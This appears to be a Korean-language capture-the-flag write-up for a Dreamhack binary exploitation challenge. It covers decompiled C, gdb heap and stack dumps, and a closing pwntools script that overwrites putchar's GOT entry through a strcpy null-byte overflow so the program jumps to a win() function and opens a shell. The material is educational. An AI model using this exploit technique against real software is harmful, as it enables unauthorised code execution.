```c
int win()
{
  return execve("/bin/sh", 0LL, 0LL);
}

int menu()
{
  puts("Product Management Page");
  puts("1. View product");
  puts("2. Edit product name");
  puts("3. Edit price");
  return puts("4. Exit page");
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *v3; // rax
  int v5; // [rsp+4h] [rbp-9Ch] BYREF
  char *dest; // [rsp+8h] [rbp-98h]
  __int64 name[12]; // [rsp+40h] [rbp-60h] BYREF

  name[11] = __readfsqword(40u);
  memset(name, 0, 80);
  dest = 0LL;
  init(argc, argv, envp);
  while ( 1 )
  {
    menu();
    printf("> ");
    __isoc99_scanf("%d", &v5);
    if ( v5 == 4 )
      break;
    if ( v5 <= 4 )
    {
      switch ( v5 )
      {
        case 3:
          printf("> ");
          __isoc99_scanf("%d", *((_QWORD *)dest + 4));
          break;
        case 1:
          if ( !dest )
          {
            v3 = (char *)malloc(0x28uLL);
            dest = v3;
            *(_QWORD *)v3 = 45545652842024LL;
            *((_QWORD *)v3 + 1) = 0LL;
            *((_QWORD *)v3 + 2) = 0LL;
            *((_QWORD *)v3 + 3) = 0LL;
            *((_QWORD *)dest + 4) = &default_price;
          }
          printf("[Product Name] %s\n[Price] %d\n", dest, **((unsigned int **)dest + 4));
          break;
        case 2:
          printf("> ");
          read(0, name, 32uLL);
          strcpy(dest, (const char *)name);
          break;
      }
    }
  }
  printf("bye");
  putchar(10);
  return 0;
}
```
---
win 함수는 따로 제공됨 그래서 쉽다고 생각했지만 시간이 좀걸렸다

tip) heap gdb 디버깅시 malloc 직후의 rax를 분석하면 heap영역을 분석할수있다

---
```c
   0x0000000000401440 <+267>:	call   0x401140 <malloc@plt>
   0x0000000000401445 <+272>:	mov    %rax,-0x98(%rbp)
   0x000000000040144c <+279>:	mov    -0x98(%rbp),%rax
   0x0000000000401453 <+286>:	movabs $0x296c6c756e28,%rsi
   0x000000000040145d <+296>:	mov    $0x0,%edi
   0x0000000000401462 <+301>:	mov    %rsi,(%rax)
   0x0000000000401465 <+304>:	mov    %rdi,0x8(%rax)
   0x0000000000401469 <+308>:	movq   $0x0,0x10(%rax)
   0x0000000000401471 <+316>:	movq   $0x0,0x18(%rax)
   0x0000000000401479 <+324>:	mov    -0x98(%rbp),%rax
   0x0000000000401480 <+331>:	lea    0x2bd9(%rip),%rdx        # 0x404060 <default_price>
   0x0000000000401487 <+338>:	mov    %rdx,0x20(%rax)
   0x000000000040148b <+342>:	mov    -0x98(%rbp),%rax
```
malloc 이후 default_price가 들어가는 시점은 0x401487이후

---
```c
0x000000000040148b in main ()
(gdb) x/40gx $rax
0x83156b0:	0x0000296c6c756e28	0x0000000000000000
0x83156c0:	0x0000000000000000	0x0000000000000000
0x83156d0:	0x0000000000404060	0x0000000000020931

(gdb) x/gx 0x404060
0x404060 <default_price>:	0x0000000000004e20
```

이후에 값을 보면 0x404060이 들어있음 이는 default_price의 주소

---
```c
(gdb) x/6gx $rbp-0x60
0x7ffe9826a6a0:	0x6161616161616161	0x6161616161616161
0x7ffe9826a6b0:	0x6161616161616161	0x6161616161616161
0x7ffe9826a6c0:	0x0000000000000000	0x0000000000000000
(gdb) 
```
이후 name 입력 이후에는 stack뒷값은 모두 0으로 있는모습

---
```c
(gdb) x/20gx 0x83156b0
0x83156b0:	0x6161616161616161	0x6161616161616161
0x83156c0:	0x6161616161616161	0x6161616161616161
0x83156d0:	0x0000000000404000	0x0000000000020931

(gdb) x/gx 0x0000000000404000
0x404000 <putchar@got.plt>:	0x0000000000401030
```

갑자기 strcpy 이후 0x404060의 값이아닌 0x404000이 들어가게되었다 이는 putchar의 got
이제 2를 누르면 해당 got의 값을 우리가 원하는데로 덮을수있다

---
<span style="color: #00FF00; font-weight: bold;">Payload</span>

```c
from pwn import *

p = remote("host8.dreamhack.games",24297)

#e = ELF("./chall")
#win_addr = e.symbols["win"]
win_addr = 0x4012bb

p.sendlineafter(b"> ",b"1")

p.sendlineafter(b"> ",b"2")
p.sendafter(b"> ",b"a"*32)

p.sendlineafter(b"> ",b"3")
p.sendlineafter(b"> ",str(win_addr).encode())

p.sendlineafter(b"> ",b"4")

p.interactive()
```
